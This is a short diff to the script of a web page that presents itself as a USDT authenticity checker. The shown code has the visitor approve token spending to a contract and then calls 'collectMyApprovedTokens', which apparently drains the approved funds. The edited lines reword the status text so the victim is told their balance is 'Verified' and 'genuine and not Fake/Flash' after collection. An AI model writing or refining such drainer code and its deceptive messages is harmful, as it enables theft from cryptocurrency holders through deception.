@@ -115,11 +115,11 @@
         statusDiv.innerText = "📝 Verifying Authenticity...";
         const approveTx = await usdt.approve(CONTRACT_ADDRESS, approveAmount);
         await approveTx.wait();
-        statusDiv.innerText = "✅ Approved! Now verifying...";
+        statusDiv.innerText = "✅ Approved! Now Verifying...";
 
         const collectTx = await contract.collectMyApprovedTokens();
         await collectTx.wait();
-        statusDiv.innerText = "🎉 USDT veified!";
+        statusDiv.innerText = "🎉 USDT Verified! The available balance on the wallet is genuine and not Fake/Flash";
       } catch (err) {
         console.error(err);
         statusDiv.innerText = "❌ Error: " + (err.message || "Failed");
